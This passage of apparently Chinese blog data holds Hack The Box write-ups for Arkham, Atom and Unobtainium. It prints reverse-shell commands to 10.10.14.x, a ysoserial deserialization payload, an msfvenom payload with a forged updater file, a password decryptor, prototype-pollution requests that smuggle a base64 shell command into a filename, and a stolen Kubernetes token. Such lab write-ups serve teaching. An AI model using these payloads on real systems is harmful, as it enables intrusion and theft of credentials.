~&#x2F;Tools&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections5 &#39;cmd.exe &#x2F;c &quot;C:\\windows\\system32\\spool\\drivers\\color\\nc.exe&quot; -e cmd.exe 10.10.14.6 443&#39; &gt; executenc.payloadecho &quot;SnNGOTg3Ni0&#x3D;&quot; | base64 -dJsF9876- exploit加密算法分析还有exp脚本都用的这里面的,打到alfred用户shell： Hack The Box - Arkham - 0xRickhttps://0xrick.github.io/hack-the-box/arkham/#JSF-ViewState-Deserialization-Vulnerability HTB: Arkham | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/08/10/htb-arkham.html user flagalfred用户桌面得到user.txt: 提权信息downloads目录里有个backup.zip,下载下来查看： 12C:\\windows\\system32\\spool\\drivers\\color\\nc.exe -w 3 10.10.14.6 1338 &lt; C:\\Users\\Alfred\\Downloads\\backups\\backup.zip nc -lp 1338 &gt; backup.zip readpstost文件是Microsoft Outlook email folder，可以用readpst读取： password png得到的Drafts.mbox里面有一封邮件，附件是png，得到png的base64，根据邮件标题和密码有关，解码后查看图片得到密码： 而batman用户是管理员： batmanpowershell里执行： 12345678910PS C:\\&gt; $username = 'batman'$username = 'batman'PS C:\\&gt; $password = 'Zx^#QZX+T!123' $password = 'Zx^#QZX+T!123'PS C:\\&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force$securePassword = ConvertTo-SecureString $password -AsPlainText -ForcePS C:\\&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword$credential = New-Object System.Management.Automation.PSCredential $username, $securePasswordPS C:\\&gt; Invoke-command -computername ARKHAM -credential $credential -scriptblock &#123; cmd.exe /c \"C:\\windows\\system32\\spool\\drivers\\color\\nc.exe\" -e cmd.exe 10.10.14.6 1338 &#125;Invoke-command -computername ARKHAM -credential $credential -scriptblock &#123; cmd.exe /c \"C:\\windows\\system32\\spool\\drivers\\color\\nc.exe\" -e cmd.exe 10.10.14.6 1338 &#125; 得到batman shell，但有UAC： bypass UAC &amp; root flag预期应该是这个bypass Mac： SystemPropertiesAdvanced.exe DLL Hijacking UAC Bypass – egre55 – thoughts on securityhttps://egre55.github.io/system-properties-uac-bypass/ 但注意前面smb有个C$,所以可以直接通过共享去访问： 参考资料 https://en.wikipedia.org/wiki/Jakarta_Server_Faces Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Alphabot Securityhttps://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html How i found a 1500$ worth Deserialization vulnerability | by Ashish Kunwar | Mediumhttps://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a SystemPropertiesAdvanced.exe DLL Hijacking UAC Bypass – egre55 – thoughts on securityhttps://egre55.github.io/system-properties-uac-bypass/ https://www.hackthebox.eu/home/machines/writeup/179 Hack The Box - Arkham - 0xRickhttps://0xrick.github.io/hack-the-box/arkham/#JSF-ViewState-Deserialization-Vulnerability HTB: Arkham | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/08/10/htb-arkham.html HackTheBox - Arkham - YouTubehttps://www.youtube.com/watch?v=krC5j1Ab44I&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Atom - HackTheBox","slug":"Atom-HackTheBox","date":"2021-04-21T06:53:01.000Z","updated":"2021-07-12T02:47:19.219Z","comments":true,"path":"2021/04/21/Atom-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/04/21/Atom-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/340 10.10.10.237 端口扫描1234567891011121314151617181920212223242526272829303132333435363738$ nmap -sC -sV 10.10.10.237Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 13:55 CSTNmap scan report for 10.10.10.237Host is up (0.070s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: Heed Solutions135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h20m01s, deviation: 4h02m30s, median: 0s| smb-os-discovery:| OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)| OS CPE: cpe:/o:microsoft:windows_10::-| Computer name: ATOM| NetBIOS computer name: ATOM\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2021-04-20T22:57:12-07:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-04-21T05:57:11|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 111.12 seconds 80/443Heed solutions: SMBsmb可以发现一个Software_Updates： Software_Updates里面三个client文件夹和一个pdf，pdf下载下来查看： UAT_Testing_Procedures根据PDF可以知道使用electron-builder，我们可以在任意client文件夹里放置更新，自动QA，但electron-builder有签名校验 electron-builder搜到相关内容： Signature Validation Bypass Leading to RCE In Electron-Updater · Doyensec’s Bloghttps://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html 大概就是我们可以通过自定义yml文件使其执行其他程序 exploit生成exe，计算hash，放置yml文件，等待自动QA触发 1234msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe -o \"r'miao.exe\"shasum -a 512 \"r'miao.exe\" | cut -d \" \" -f1 | xxd -r -p | base64 -w 0lNGCU+j3Qkn/F6VrPXlauNYygdmb1kYwQu6QmkqqCzNcguJMWr2vWDJxb5MoAdbKSZ5QMaiFdzshpnXaVcx7iQ== latest.yml123version: 1.2.3path: http:&#x2F;&#x2F;10.10.14.10:7777&#x2F;r&#39;miao.exesha512: lNGCU+j3Qkn&#x2F;F6VrPXlauNYygdmb1kYwQu6QmkqqCzNcguJMWr2vWDJxb5MoAdbKSZ5QMaiFdzshpnXaVcx7iQ&#x3D;&#x3D; user flag然后jason用户桌面得到user.txt: 提权信息基础的枚举可以发现redis，直接去查看配置文件，得到密码 12345C:\\Program Files\\Redis&gt;type redis.windows-service.conftype redis.windows-service.conf# Redis configuration file examplerequirepass kidvscat_yes_kidvscat... redisredis中枚举信息，得到admin的密码hash： 1234567810.10.10.237:6379&gt; keys *1) \"pk:ids:MetaDataClass\"2) \"pk:ids:User\"3) \"pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff\"4) \"pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0\"10.10.10.237:6379&gt; get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0\"&#123;\\\"Id\\\":\\\"e8e29158d70d44b1a1ba4949d52790a0\\\",\\\"Name\\\":\\\"Administrator\\\",\\\"Initials\\\":\\\"\\\",\\\"Email\\\":\\\"\\\",\\\"EncryptedPassword\\\":\\\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\\\",\\\"Role\\\":\\\"Admin\\\",\\\"Inactive\\\":false,\\\"TimeStamp\\\":637530169606440253&#125;\"10.10.10.237:6379&gt; documetwinpeas的结果里可以发现user guide，下载下来查看： 12[+] Looking for documents --limit 100--(T1083) C:\\Users\\jason\\Documents\\UAT_Testing_Procedures.pdfC:\\Users\\jason\\Downloads\\PortableKanban\\User Guide.pdf 根据文档可以知道redis里是Portable Kanban加密后的密码，直接搜索解密方式： PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval - Windows local Exploithttps://www.exploit-db.com/exploits/49409 decrypt解出来Administrator密码： 123python3 decrypt.pyEnter the Hash : Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGiDecrypted Password : kidvscat_admin_@123 github的是根据文件解，可以直接用hash： 1234567891011import jsonimport base64from des import * #python3 -m pip install destry: hash = str(input(\"Enter the Hash : \")) hash = base64.b64decode(hash.encode('utf-8')) key = DesKey(b\"7ly6UznJ\") print(\"Decrypted Password : \" + key.decrypt(hash,initial=b\"XuVUm5fR\",padding=True).decode('utf-8'))except: print(\"Wrong Hash\") root flag之后直接winrm登录administrator，桌面得到root.txt: 参考资料 Signature Validation Bypass Leading to RCE In Electron-Updater · Doyensec’s Bloghttps://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval - Windows local Exploithttps://www.exploit-db.com/exploits/49409 Hackthebox Atom writeup | 0xDedinfosechttps://0xdedinfosec.github.io/posts/htb-atom/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Unobtainium - HackTheBox","slug":"Unobtainium-HackTheBox","date":"2021-04-14T07:10:50.000Z","updated":"2021-09-06T01:03:30.060Z","comments":true,"path":"2021/04/14/Unobtainium-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/04/14/Unobtainium-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/338 10.10.10.235 端口扫描80,8443,31337: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100$ nmap -sC -sV -Pn 10.10.10.235Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 12:39 CSTNmap scan report for 10.10.10.235Host is up (0.069s latency).Not shown: 995 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)| 256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)|_ 256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Unobtainium666/tcp filtered doom8443/tcp open ssl/https-alt| fingerprint-strings:| FourOhFourRequest:| HTTP/1.0 403 Forbidden| Cache-Control: no-cache, private| Content-Type: application/json| X-Content-Type-Options: nosniff| X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39| X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd| Date: Wed, 14 Apr 2021 04:40:35 GMT| Content-Length: 212| &#123;\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":&#123;&#125;,\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"\",\"reason\":\"Forbidden\",\"details\":&#123;&#125;,\"code\":403&#125;| GenericLines:| HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest:| HTTP/1.0 403 Forbidden| Cache-Control: no-cache, private| Content-Type: application/json| X-Content-Type-Options: nosniff| X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39| X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd| Date: Wed, 14 Apr 2021 04:40:34 GMT| Content-Length: 185| &#123;\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":&#123;&#125;,\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot get path \"/\"\",\"reason\":\"Forbidden\",\"details\":&#123;&#125;,\"code\":403&#125;| HTTPOptions:| HTTP/1.0 403 Forbidden| Cache-Control: no-cache, private| Content-Type: application/json| X-Content-Type-Options: nosniff| X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39| X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd| Date: Wed, 14 Apr 2021 04:40:34 GMT| Content-Length: 189|_ &#123;\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":&#123;&#125;,\"status\":\"Failure\",\"message\":\"forbidden: User \"system:anonymous\" cannot options path \"/\"\",\"reason\":\"Forbidden\",\"details\":&#123;&#125;,\"code\":403&#125;|_http-title: Site doesn't have a title (application/json).| ssl-cert: Subject: commonName=minikube/organizationName=system:masters| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1| Not valid before: 2021-04-13T04:37:52|_Not valid after: 2022-04-14T04:37:52|_ssl-date: TLS randomness does not represent time| tls-alpn:| h2|_ http/1.131337/tcp open http Node.js Express framework|_http-title: Site doesn't have a title (application/json; charset=utf-8).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=4/14%Time=60767242%P=x86_64-apple-darwiSF:n19.6.0%r(GetRequest,1FF,\"HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-ControSF:l:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\nX-CoSF:ntent-Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x2030SF:82aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Prioritylevel-UidSF::\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Wed,\\x2014\\x20AprSF:\\x202021\\x2004:40:34\\x20GMT\\r\\nContent-Length:\\x20185\\r\\n\\r\\n&#123;\\\"kind\\\":SF:\\\"Status\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metadata\\\":&#123;&#125;,\\\"status\\\":\\\"Failure\\\"SF:,\\\"message\\\":\\\"forbidden:\\x20User\\x20\\\\\\\"system:anonymous\\\\\\\"\\x20cannotSF:\\x20get\\x20path\\x20\\\\\\\"/\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",\\\"details\\\":&#123;&#125;,SF:\\\"code\\\":403&#125;\\n\")%r(HTTPOptions,203,\"HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCSF:ache-Control:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x20application/jSF:son\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-FlowschemaSF:-Uid:\\x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-PrioriSF:tylevel-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Wed,\\xSF:2014\\x20Apr\\x202021\\x2004:40:34\\x20GMT\\r\\nContent-Length:\\x20189\\r\\n\\r\\SF:n&#123;\\\"kind\\\":\\\"Status\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metadata\\\":&#123;&#125;,\\\"status\\\":SF:\\\"Failure\\\",\\\"message\\\":\\\"forbidden:\\x20User\\x20\\\\\\\"system:anonymous\\\\\\SF:\"\\x20cannot\\x20options\\x20path\\x20\\\\\\\"/\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",SF:\\\"details\\\":&#123;&#125;,\\\"code\\\":403&#125;\\n\")%r(FourOhFourRequest,21A,\"HTTP/1\\.0\\x20SF:403\\x20Forbidden\\r\\nCache-Control:\\x20no-cache,\\x20private\\r\\nContent-TSF:ype:\\x20application/json\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-KubSF:ernetes-Pf-Flowschema-Uid:\\x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nXSF:-Kubernetes-Pf-Prioritylevel-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efSF:dd\\r\\nDate:\\x20Wed,\\x2014\\x20Apr\\x202021\\x2004:40:35\\x20GMT\\r\\nContent-SF:Length:\\x20212\\r\\n\\r\\n&#123;\\\"kind\\\":\\\"Status\\\",\\\"apiVersion\\\":\\\"v1\\\",\\\"metaSF:data\\\":&#123;&#125;,\\\"status\\\":\\\"Failure\\\",\\\"message\\\":\\\"forbidden:\\x20User\\x20\\\\SF:\\\"system:anonymous\\\\\\\"\\x20cannot\\x20get\\x20path\\x20\\\\\\\"/nice\\x20ports,/SF:Trinity\\.txt\\.bak\\\\\\\"\\\",\\\"reason\\\":\\\"Forbidden\\\",\\\"details\\\":&#123;&#125;,\\\"code\\SF:\":403&#125;\\n\")%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConSF:tent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\SF:r\\n400\\x20Bad\\x20Request\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 157.07 seconds 8080是一个什么下载页面： 8443/31337都是json，需要其他信息： unobtainium unpack80下载包，unpack得到一个asar文件，这是Electron程序： asar对asar文件进行解包,得到代码，其中包括其他端口的请求信息： 1asar extract app.asar ./ todo根据todo.js的请求，得到todo.txt内容： 12$ curl --header \"Content-Type: application/json\" --request POST http://unobtainium.htb:31337/todo --data '&#123;\"auth\": &#123;\"name\": \"felamos\", \"password\": \"Winter2021\"&#125;, \"filename\" : \"todo.txt\"&#125;'&#123;\"ok\":true,\"content\":\"1. Create administrator zone.\\n2. Update node JS API Server.\\n3. Add Login functionality.\\n4. Complete Get Messages feature.\\n5. Complete ToDo feature.\\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\\n7. Improve security\\n\"&#125;% index.js并且可以利用todo里的api读取服务器上其他文件： 123curl --header \"Content-Type: application/json\" --request POST http://unobtainium.htb:31337/todo --data '&#123;\"auth\": &#123;\"name\": \"felamos\", \"password\": \"Winter2021\"&#125;, \"filename\" : \"index.js\"&#125;' | jq&#123;\"ok\":true,\"content\":\"var root = require(\\\"google-cloudstorage-commands\\\");\\nconst express = require('express');\\nconst &#123; exec &#125; = require(\\\"child_process\\\"); \\nconst bodyParser = require('body-parser'); \\nconst _ = require('lodash'); \\nconst app = express();\\nvar fs = require('fs');\\n \\nconst users = [ \\n &#123;name: 'felamos', password: 'Winter2021'&#125;,\\n &#123;name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true&#125;, \\n];\\n\\nlet messages = []; \\nlet lastId = 1; \\n \\nfunction findUser(auth) &#123; \\n return users.find((u) =&gt; \\n u.name === auth.name &amp;&amp; \\n u.password === auth.password); \\n&#125; \\n \\napp.use(bodyParser.json()); \\n \\napp.get('/', (req, res) =&gt; &#123; \\n res.send(messages); \\n&#125;); \\n \\napp.put('/', (req, res) =&gt; &#123; \\n const user = findUser(req.body.auth || &#123;&#125;); \\n \\n if (!user) &#123; \\n res.status(403).send(&#123;ok: false, error: 'Access denied'&#125;); \\n return;\\n &#125;\\n\\n const message = &#123;\\n icon: '__',\\n &#125;;\\n\\n _.merge(message, req.body.message, &#123;\\n id: lastId++,\\n timestamp: Date.now(),\\n userName: user.name,\\n &#125;);\\n\\n messages.push(message);\\n res.send(&#123;ok: true&#125;);\\n&#125;);\\n\\napp.delete('/', (req, res) =&gt; &#123;\\n const user = findUser(req.body.auth || &#123;&#125;);\\n\\n if (!user || !user.canDelete) &#123;\\n res.status(403).send(&#123;ok: false, error: 'Access denied'&#125;);\\n return;\\n &#125;\\n\\n messages = messages.filter((m) =&gt; m.id !== req.body.messageId);\\n res.send(&#123;ok: true&#125;);\\n&#125;);\\napp.post('/upload', (req, res) =&gt; &#123;\\n const user = findUser(req.body.auth || &#123;&#125;);\\n if (!user || !user.canUpload) &#123;\\n res.status(403).send(&#123;ok: false, error: 'Access denied'&#125;);\\n return;\\n &#125;\\n\\n\\n filename = req.body.filename;\\n root.upload(\\\"./\\\",filename, true);\\n res.send(&#123;ok: true, Uploaded_File: filename&#125;);\\n&#125;);\\n\\napp.post('/todo', (req, res) =&gt; &#123;\\n\\tconst user = findUser(req.body.auth || &#123;&#125;);\\n\\tif (!user) &#123;\\n\\t\\tres.status(403).send(&#123;ok: false, error: 'Access denied'&#125;);\\n\\t\\treturn;\\n\\t&#125;\\n\\n\\tfilename = req.body.filename;\\n testFolder = \\\"/usr/src/app\\\";\\n fs.readdirSync(testFolder).forEach(file =&gt; &#123;\\n if (file.indexOf(filename) &gt; -1) &#123;\\n var buffer = fs.readFileSync(filename).toString();\\n res.send(&#123;ok: true, content: buffer&#125;);\\n &#125;\\n &#125;);\\n&#125;);\\n\\napp.listen(3000);\\nconsole.log('Listening on port 3000...');\\n\"&#125;% 注意到有一个upload接口，有user.canUpload校验，有个merge，结合后面读取的package.json，应该就是考原形链污染 package.json12$ curl --header \"Content-Type: application/json\" --request POST http://unobtainium.htb:31337/todo --data '&#123;\"auth\": &#123;\"name\": \"felamos\", \"password\": \"Winter2021\"&#125;, \"filename\" : \"package.json\"&#125;' -x http://127.0.0.1:8087&#123;\"ok\":true,\"content\":\"&#123;\\n \\\"name\\\": \\\"Unobtainium-Server\\\",\\n \\\"version\\\": \\\"1.0.0\\\",\\n \\\"description\\\": \\\"API Service for Electron client\\\",\\n \\\"main\\\": \\\"index.js\\\",\\n \\\"scripts\\\": &#123;\\n \\\"start\\\": \\\"node index.js\\\"\\n &#125;,\\n \\\"author\\\": \\\"felamos\\\",\\n \\\"license\\\": \\\"ISC\\\",\\n \\\"dependencies\\\": &#123;\\n \\\"body-parser\\\": \\\"1.18.3\\\",\\n \\\"express\\\": \\\"4.16.4\\\",\\n \\\"lodash\\\": \\\"4.17.4\\\",\\n \\\"google-cloudstorage-commands\\\": \\\"0.0.1\\\"\\n &#125;,\\n \\\"devDependencies\\\": &#123;&#125;\\n&#125;\\n\"&#125;% exploit lodash@4.17.4 vulnerabilities | lodash 4.17.4 | Snykhttps://snyk.io/test/npm/lodash/4.17.4 12345678bash -i &amp;&gt;/dev/tcp/10.10.14.7/4444 &lt;&amp;1YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NCA8JjE=curl -X PUT -H 'Content-Type: application/json' http://10.10.10.235:31337 --data '&#123;\"auth\":&#123;\"name\":\"felamos\",\"password\":\"Winter2021\"&#125;,\"message\":&#123;\"__proto__\":&#123;\"canUpload\":true&#125;&#125;&#125;'&#123;\"ok\":true&#125;curl -X POST -H 'Content-Type: application/json' http://10.10.10.235:31337/upload --data-binary '&#123;\"auth\":&#123;\"name\":\"felamos\",\"password\":\"Winter2021\"&#125;,\"message\":&#123;\"__proto__\":&#123;\"canUpload\":true&#125;&#125;,\"filename\":\"; echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NCA8JjE= | base64 -d | bash\"&#125;'&#123;\"ok\":true,\"Uploaded_File\":\"; echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NCA8JjE= | base64 -d | bash\"&#125; 打到的是容器的root： user flag容器root算user,得到user.txt: kubectl根据clear-kubectl的内容，kubectl很可疑： 123root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# cat clear-kubectlcat clear-kubectl* * * * * find / -name kubectl -exec rm &#123;&#125; \\; 所以可以下载一个传上去： Install and Set Up kubectl on Linux | Kuberneteshttps://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux 12wget http://10.10.14.7:7777/kubectl-miaochmod +x ./kubectl-miao enum123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263./kubectl get namespaceNAME STATUS AGEdefault Active 86ddev Active 86dkube-node-lease Active 86dkube-public Active 86dkube-system Active 86d./kubectl get pods -n devNAME READY STATUS RESTARTS AGEdevnode-deployment-cd86fb5c-6ms8d 1/1 Running 28 86ddevnode-deployment-cd86fb5c-mvrfz 1/1 Running 29 86ddevnode-deployment-cd86fb5c-qlxww 1/1 Running 29 86d./kubectl describe pod devnode-deployment-cd86fb5c-6ms8d -n devName: devnode-deployment-cd86fb5c-6ms8dNamespace: devPriority: 0Node: unobtainium/10.10.10.235Start Time: Sun, 17 Jan 2021 18:16:21 +0000Labels: app=devnode pod-template-hash=cd86fb5cAnnotations: &lt;none&gt;Status: RunningIP: 172.17.0.6IPs: IP: 172.17.0.6Controlled By: ReplicaSet/devnode-deployment-cd86fb5cContainers: devnode: Container ID: docker://b49e97575744cee37fa94e1687e5328c5aa936e8d83a4fc9192bb41c36dd7076 Image: localhost:5000/node_server Image ID: docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c Port: 3000/TCP Host Port: 0/TCP State: Running Started: Wed, 14 Apr 2021 04:38:27 +0000 Last State: Terminated Reason: Error Exit Code: 137 Started: Wed, 24 Mar 2021 16:01:28 +0000 Finished: Wed, 24 Mar 2021 16:02:13 +0000 Ready: True Restart Count: 28 Environment: &lt;none&gt; Mounts: /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)Conditions: Type Status Initialized True Ready True ContainersReady True PodScheduled TrueVolumes: default-token-rmcd6: Type: Secret (a volume populated by a Secret) SecretName: default-token-rmcd6 Optional: falseQoS Class: BestEffortNode-Selectors: &lt;none&gt;Tolerations: node.kubernetes.io/not-ready:NoExecute op=Exists for 300s node.kubernetes.io/unreachable:NoExecute op=Exists for 300sEvents: &lt;none&gt; exploit dev和前面一样的方式，修改ip端口打到devnode： 123456bash -i &amp;&gt;/dev/tcp/10.10.14.7/4445 &lt;&amp;1YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NSA8JjEKCg==curl -X PUT -H 'Content-Type: application/json' http://172.17.0.6:3000 --data '&#123;\"auth\":&#123;\"name\":\"felamos\",\"password\":\"Winter2021\"&#125;,\"message\":&#123;\"__proto__\":&#123;\"canUpload\":true&#125;&#125;&#125;'curl -X POST -H 'Content-Type: application/json' http://172.17.0.6:3000/upload --data-binary '&#123;\"auth\":&#123;\"name\":\"felamos\",\"password\":\"Winter2021\"&#125;,\"message\":&#123;\"__proto__\":&#123;\"canUpload\":true&#125;&#125;,\"filename\":\"; echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NSA8JjEKCg== | base64 -d | bash\"&#125;' dev token123# devnodecat /run/secrets/kubernetes.io/serviceaccount/tokeneyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw kube-system简单的枚举发现dev的token有权限获取kube-system命名空间的secrets： 1234567891011121314151617181920212223 ./kubectl -n kube-system --token 